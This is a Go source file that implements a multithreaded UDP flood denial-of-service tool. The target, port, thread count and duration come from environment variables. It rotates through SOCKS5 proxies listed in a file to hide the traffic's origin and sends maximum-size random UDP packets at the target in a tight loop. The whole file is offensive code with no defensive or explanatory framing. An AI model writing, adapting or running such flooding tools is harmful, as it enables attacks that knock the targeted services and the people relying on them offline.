package main

import (
	"bufio"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"
)

var (
	target   string
	port     int
	threads  int
	duration int
	proxies  []string
	wg       sync.WaitGroup
)

func loadProxies() error {
	file, err := os.Open("proxies.txt")
	if err != nil {
		return err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
	return scanner.Err()
}

func udpMix(proxyAddr string, stop chan struct{}) {
	defer wg.Done()

	var dialer proxy.Dialer
	var err error

	if proxyAddr != "" {
		dialer, err = proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
		if err != nil {
			return
		}
	} else {
		dialer = proxy.Direct
	}

	payload := make([]byte, 65507)
	rand.Read(payload)

	for {
		select {
		case <-stop:
			return
		default:
			conn, err := dialer.Dial("udp", fmt.Sprintf("%s:%d", target, port))
			if err != nil {
				continue
			}

			for i := 0; i < 50; i++ {
				conn.Write(payload)
				time.Sleep(10 * time.Millisecond)
			}
			conn.Close()
		}
	}
}

func main() {
	target = os.Getenv("target")
	port, _ = strconv.Atoi(os.Getenv("port"))
	threads, _ = strconv.Atoi(os.Getenv("threads"))
	duration, _ = strconv.Atoi(os.Getenv("duration"))

	if err := loadProxies(); err != nil || len(proxies) == 0 {
		proxies = []string{""}
	}

	stop := make(chan struct{})
	for i := 0; i < threads; i++ {
		wg.Add(1)
		proxyAddr := ""
		if len(proxies) > 0 {
			proxyAddr = proxies[rand.Intn(len(proxies))]
		}
		go udpMix(proxyAddr, stop)
	}

	time.Sleep(time.Duration(duration) * time.Second)
	close(stop)
	wg.Wait()
}